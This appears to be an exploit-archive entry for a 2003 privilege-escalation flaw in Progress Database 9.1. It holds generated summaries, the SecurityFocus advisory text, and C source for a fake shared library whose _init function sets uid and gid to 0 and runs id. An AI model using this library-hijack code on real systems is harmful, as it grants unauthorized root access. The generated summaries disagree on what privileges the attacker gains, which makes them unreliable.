// #<-- Publish Date --># // 2003-06-14 // #<-- Technical Document Summary (TDS) --># // The exploit leverages improper input validation in Progress Database 9.1's dlopen() function, which fails to sanitize untrusted shared library paths. By manipulating the PATH environment variable, an attacker can cause the system to load and execute arbitrary code with elevated privileges through the _init function. The vulnerability stems from unchecked user-controlled file paths during dynamic library loading. This allows unauthorized privilege escalation without requiring additional exploits or authentication bypass mechanisms. The mechanism involves the use of a fake library that executes system commands upon loading, specifically invoking /usr/bin/id and reading files via cat. No successful exploitation is demonstrated in the source; only the potential for unauthorized privilege gain is indicated. // #<-- Layman's Document Summary (LDS) --># // The weakness allows an attacker to load arbitrary shared libraries based on manipulated environment variables, leading to execution of code with higher privileges than the user process. This occurs because the dlopen() function does not validate or restrict the paths provided by the PATH variable when loading libraries. The exploit enables an attacker to run commands as the user who initiated the Progress Database application. The affected component is the Progress Database 9.1 environment variable handling mechanism, specifically within the _init function of shared libraries. // #<-- Key Words (KW) --># // Progress Database, dlopen, setuid, setgid, PATH environment variable, dynamic library loading, privilege escalation, system command execution, /usr/bin/id, environment variable manipulation, credential elevation // #<-- Related Terms --># // environment variable injection, shared library loading, setuid binary, privilege escalation, code injection, path traversal, dlopen vulnerability, credential theft, exploit chaining, operating system level vulnerability // #<-- Entities/Attributes --># // Software: Progress Database, Function: _init, Path: /tmp/p00p, Command: id, File: /usr/bin/id, Vulnerable component: ehnLogOpen, setuid, setgid // #<-- Vulnerability Type --># // Not specified in source // #<-- Original Content --># // source: https://www.securityfocus.com/bid/7916/info It has been reported that Progress database does not properly handle untrusted input when opening shared libraries. Specifically, the dlopen() function used by several Progress utilities checks the user's PATH environment variable when including shared object libraries. If any shared objects are found, Progress will load and execute them. Due to this, an attacker may be able to gain unauthorized privileges. Any library code loaded will execute with elevated privileges. #include <stdio.h> #include <string.h> // If you wanted to get creative you can hack out some fake functions for // use later ... but theres no need... just use _init int ehnLogOpen(int argc, char * const argv[], const char *optstring) { printf("This is a fake ehnLogOpen 
"); } int ehnLogClose(int argc, char * const argv[], const char *optstring) { printf("This is a fake ehnLogClose
"); } _init() { setuid(0); setgid(0); printf("bullshit library loaded
"); system("/usr/bin/id > /tmp/p00p"); system("cat /tmp/p00p"); }

